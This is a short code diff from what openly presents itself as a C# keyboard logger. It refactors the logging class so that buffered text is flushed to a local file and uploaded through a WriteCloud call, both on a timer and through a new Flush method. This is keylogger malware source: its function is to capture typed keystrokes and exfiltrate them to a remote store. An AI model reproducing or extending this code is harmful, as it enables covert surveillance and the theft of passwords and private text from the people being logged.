@@ -53,17 +53,25 @@ namespace KeyboardLogger.KeyLog
         }
 
 
-        // Write (txt)
-        // - write some text to log
-        public void Write(string txt)
+        // Flush (txt)
+        // - flush written log
+        public Log Flush()
         {
-            buff += txt;
-            DateTime now = DateTime.Now;
-            if (now - logTime < flushSpan) return;
             File.AppendAllText(file, buff);
             WriteCloud(id, buff);
-            logTime = now;
+            logTime = DateTime.Now;
             buff = "";
+            return this;
+        }
+
+
+        // Write (txt)
+        // - write some text to log
+        public Log Write(string txt)
+        {
+            buff += txt;
+            if (DateTime.Now - logTime < flushSpan) return this;
+            return Flush();
         }
     }
 }
